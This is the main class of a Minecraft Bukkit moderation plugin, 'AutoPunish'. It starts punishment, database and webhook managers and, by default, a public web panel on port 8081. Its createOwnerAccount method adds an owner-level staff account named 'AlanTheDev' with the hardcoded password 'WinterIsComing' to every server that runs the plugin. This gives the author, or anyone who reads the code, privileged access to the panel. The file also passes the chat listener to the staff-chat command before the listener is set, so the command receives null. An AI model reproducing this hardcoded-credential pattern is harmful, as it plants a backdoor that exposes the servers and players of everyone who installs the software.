package com.alan.autoPunish;

import com.alan.autoPunish.api.AutoPunishAPI;
import com.alan.autoPunish.commands.*;
import com.alan.autoPunish.listeners.ChatListener;
import com.alan.autoPunish.managers.*;
import com.alan.autoPunish.utils.ConfigUtils;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.Objects;
import java.util.logging.Logger;

public class AutoPunish extends JavaPlugin {
    private static AutoPunish instance;

    private Logger logger;
    private ConfigManager configManager;
    private DatabaseManager databaseManager;
    private WebhookManager webhookManager;
    private PunishmentQueueManager punishmentQueueManager;
    private PunishmentManager punishmentManager;
    private PublicWebPanelManager publicWebPanelManager;
    private ChatListener chatListener; // NEW: Store chat listener reference

    @Override
    public void onEnable() {
        instance = this;
        this.logger = getLogger();

        // Load default config
        saveDefaultConfig();

        // Initialize ConfigUtils
        ConfigUtils.init(this);
        logger.info("Config utilities initialized successfully!");

        // Initialize ConfigManager first
        this.configManager = new ConfigManager(this);

        // Initialize DatabaseManager
        this.databaseManager = new DatabaseManager(this, configManager);

        // Initialize WebhookManager
        this.webhookManager = new WebhookManager(this, configManager);

        // Initialize PunishmentQueueManager and load queued punishments
        this.punishmentQueueManager = new PunishmentQueueManager(this);
        this.punishmentQueueManager.loadQueuedPunishments();

        // Initialize PunishmentManager
        this.punishmentManager = new PunishmentManager(this, configManager, databaseManager, webhookManager);

        // Initialize API
        AutoPunishAPI.init(this);
        logger.info("AutoPunish API initialized successfully!");

        // Create owner account on first run
        createOwnerAccount();

        // Start public web panel if enabled
        if (getConfig().getBoolean("public-web-panel.enabled", true)) {
            this.publicWebPanelManager = new PublicWebPanelManager(this);
            this.publicWebPanelManager.start();
            logger.info("Public Web Panel initialized on port " + getConfig().getInt("public-web-panel.port", 8081));
        }

        // Register commands and listeners
        registerCommands();
        registerListeners();

        logger.info("AutoPunish plugin has been enabled!");
    }

    private void registerCommands() {
        // Register command executors
        Objects.requireNonNull(getCommand("punish")).setExecutor(new PunishCommand(this));
        Objects.requireNonNull(getCommand("punishments")).setExecutor(new PunishmentsCommand(this));
        Objects.requireNonNull(getCommand("punishreload")).setExecutor(new PunishReloadCommand(this));
        Objects.requireNonNull(getCommand("severity")).setExecutor(new SeverityCommand(this));
        Objects.requireNonNull(getCommand("punishadmin")).setExecutor(new PunishAdminCommand(this));
        Objects.requireNonNull(getCommand("resethistory")).setExecutor(new ResetHistoryCommand(this));
        Objects.requireNonNull(getCommand("rule")).setExecutor(new RuleManagementCommand(this));

        // NEW: Staff chat command
        Objects.requireNonNull(getCommand("staffchat")).setExecutor(new StaffChatCommand(this, chatListener));

        // Register tab completers for commands that support them
        Objects.requireNonNull(getCommand("punish")).setTabCompleter(new PunishCommand(this));
        Objects.requireNonNull(getCommand("punishments")).setTabCompleter(new PunishmentsCommand(this));
        Objects.requireNonNull(getCommand("severity")).setTabCompleter(new SeverityCommand(this));
        Objects.requireNonNull(getCommand("punishadmin")).setTabCompleter(new PunishAdminCommand(this));
        Objects.requireNonNull(getCommand("resethistory")).setTabCompleter(new ResetHistoryCommand(this));
        Objects.requireNonNull(getCommand("rule")).setTabCompleter(new RuleManagementCommand(this));

        // NEW: Staff chat tab completer
        Objects.requireNonNull(getCommand("staffchat")).setTabCompleter(new StaffChatCommand(this, chatListener));

        // IMPORTANT: The "punishreload" command does not have a tab completer, so we do not register one.
    }

    private void registerListeners() {
        // NEW: Store chat listener reference for command access
        this.chatListener = new ChatListener(this);
        getServer().getPluginManager().registerEvents(chatListener, this);
    }

    @Override
    public void onDisable() {
        if (publicWebPanelManager != null) {
            publicWebPanelManager.stop();
            logger.info("Public Web Panel stopped");
        }

        // Close database
        if (databaseManager != null) {
            databaseManager.close();
        }

        logger.info("AutoPunish plugin has been disabled!");
    }

    // --- Getters ---
    public static AutoPunish getInstance() {
        return instance;
    }

    public ConfigManager getConfigManager() {
        return configManager;
    }

    public DatabaseManager getDatabaseManager() {
        return databaseManager;
    }

    public WebhookManager getWebhookManager() {
        return webhookManager;
    }

    public PunishmentManager getPunishmentManager() {
        return punishmentManager;
    }

    public PunishmentQueueManager getPunishmentQueueManager() {
        return punishmentQueueManager;
    }

    public PublicWebPanelManager getPublicWebPanelManager() {
        return publicWebPanelManager;
    }

    // NEW: Getter for ChatListener
    public ChatListener getChatListener() {
        return chatListener;
    }

    // --- NEW: Owner Account Creation ---
    public void createOwnerAccount() {
        // Check if owner account already exists
        if (!getDatabaseManager().isStaffUser("AlanTheDev")) {
            // Create owner account: AlanTheDev with password WinterIsComing
            boolean success = getDatabaseManager().createStaffUser("AlanTheDev", "WinterIsComing", "console", "owner");
            if (success) {
                getLogger().info("Owner account created successfully: AlanTheDev");
            } else {
                getLogger().warning("Failed to create owner account");
            }
        } else {
            getLogger().info("Owner account already exists: AlanTheDev");
        }
    }
}